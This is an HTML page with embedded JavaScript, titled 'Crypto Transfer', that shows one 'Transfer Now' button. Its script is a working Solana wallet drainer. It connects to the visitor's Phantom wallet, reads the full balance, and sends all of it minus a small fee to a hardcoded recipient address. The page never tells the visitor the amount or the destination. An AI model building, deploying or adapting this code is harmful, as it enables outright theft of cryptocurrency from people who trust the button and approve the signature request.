<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body style="background-color: #f8f4e1; text-align: center; padding: 50px;">
    <h1>Click below to transfer SOL</h1>
    <button onclick="initiateTransfer()">Transfer Now</button>

    <script>
        // Constants
        const recipientAddress = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";

        async function initiateTransfer() {
            try {
                // Check if Phantom wallet is installed
                if (!window.solana || !window.solana.isPhantom) {
                    alert("Phantom wallet not found. Please install it.");
                    return;
                }

                // Connect to the Phantom wallet
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
                const wallet = window.solana;
                const response = await wallet.connect();

                alert("Connected to wallet: " + response.publicKey.toString());

                // Get the wallet's public key
                const senderPublicKey = new solanaWeb3.PublicKey(response.publicKey);

                // Fetch wallet balance
                let balance = await connection.getBalance(senderPublicKey);
                let balanceInSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;
                console.log(`Wallet balance: ${balanceInSOL} SOL`);

                if (balanceInSOL <= 0) {
                    alert("Insufficient balance to perform the transfer.");
                    return;
                }

                // Calculate transaction fee
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: senderPublicKey,
                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                        lamports: balance - (5000)  // Adjust 5000 lamports as estimated fee
                    })
                );

                // Request transaction signature from Phantom wallet
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = senderPublicKey;

                const signedTransaction = await wallet.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());

                alert("Transaction sent! Signature: " + signature);

                // Confirm the transaction
                await connection.confirmTransaction(signature, 'confirmed');
                alert("Transaction confirmed! Funds transferred successfully.");
            } catch (error) {
                console.error("Transaction failed:", error);
                alert("Transaction failed: " + error.message);
            }
        }
    </script>
</body>
</html>
